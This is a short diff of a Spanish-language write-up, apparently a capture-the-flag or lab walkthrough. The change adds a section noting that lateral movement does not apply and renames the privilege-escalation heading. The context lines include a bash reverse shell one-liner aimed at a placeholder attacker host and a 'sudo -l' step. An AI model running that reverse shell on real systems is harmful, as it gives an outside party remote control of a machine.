@@ -77,7 +77,12 @@ No hay exploit: la herramienta de desarrollo quedó en producción y sirve coman
 bash -c 'bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1'
 ```
 
-## Escalada
+## Movimiento lateral
+
+- No aplica: la cadena se resuelve en un único host, sin salto lateral.
+- Ver «Escalada de privilegios» para el paso de usuario a administrador.
+
+## Escalada de privilegios
 
 ```bash
 sudo -l
